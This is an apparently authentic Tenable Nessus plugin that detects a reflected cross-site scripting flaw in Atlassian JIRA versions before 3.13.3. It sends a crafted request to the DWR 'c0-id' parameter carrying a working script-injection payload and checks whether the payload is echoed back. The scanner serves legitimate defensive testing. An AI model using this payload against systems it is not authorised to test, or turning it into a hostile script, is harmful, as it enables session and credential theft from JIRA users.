#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(36184);
  script_version("$Revision: 1.16 $");
  script_cvs_date("$Date: 2017/05/16 19:35:39 $");

  script_bugtraq_id(34342);
  script_osvdb_id(53258);
  script_xref(name:"Secunia", value:"34556");

  script_name(english:"Atlassian JIRA < 3.13.3 DWR 'c0-id' XSS");
  script_summary(english:"Attempts a non-persistent XSS attack.");

  script_set_attribute( attribute:"synopsis",  value:
"The remote web server hosts a web application that is affected by a
cross-site scripting (XSS) vulnerability.");
  script_set_attribute( attribute:"description",  value:
"The Atlassian JIRA installation hosted on the remote web server is
affected by a cross-site scripting (XSS) vulnerability due to a
failure to sanitize input to the 'c0-id' parameter during a DWR call.
A remote attacker, using a crafted URL, can exploit this to execute
JavaScript in a user's browser.

Note that other issues have been reported with JIRA versions prior to
3.13.3; however, Nessus has not tested for these. Refer to the
advisory for more information." );
  script_set_attribute(attribute:"see_also", value:"https://jira.atlassian.com/browse/CONF-11808");
  script_set_attribute(attribute:"see_also", value:"https://jira.atlassian.com/browse/JRA-16072");
  # https://confluence.atlassian.com/display/JIRA/JIRA+Security+Advisory+2009-04-02
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?cfe21f94");
  script_set_attribute( attribute:"solution",value:
"Upgrade to Atlassian JIRA 3.13.3 or later. Alternatively, apply the
appropriate patches referenced in the vendor advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/04/02");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/04/02");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/04/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:atlassian:jira");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009-2017 Tenable Network Security, Inc.");

  script_require_ports("Services/www", 80, 8080);
  script_dependencies("jira_detect.nasl");
  script_require_keys("installed_sw/Atlassian JIRA");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = "Atlassian JIRA";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:8080);

install = get_single_install(
  app_name : app,
  port     : port
);

#differences from default - encodes ', doesn't encode /?=&
unreserved = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*()-]/?=&";
xss_warning = SCRIPT_NAME + "-" + unixtime();
xss = '/secure/dwr/exec/?callCount=1&c0-id=\');</script><script>alert("' + xss_warning + '");d(\'';
xss_encoded = urlencode(str:xss, unreserved:unreserved);
expected_output = '<script>alert("' + xss_warning + '");d(\'\', s0);\n</script>';

dir = install['path'];

res = http_send_recv3(
  port:port,
  method:"GET",
  item:dir + xss_encoded,
  exit_on_fail:TRUE
);
if (expected_output >< res[2])
{
  output = strstr(res[2], expected_output);
  if (empty_or_null(output)) output = res[2]; # Should never occur

  security_report_v4(
    port       : port,
    severity   : SECURITY_WARNING,
    generic    : TRUE,
    line_limit : 5,
    xss        : TRUE,
    request    : make_list(build_url(qs:dir + xss_encoded, port:port)),
    output     : chomp(output)
  );
}
else
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:dir, port:port));
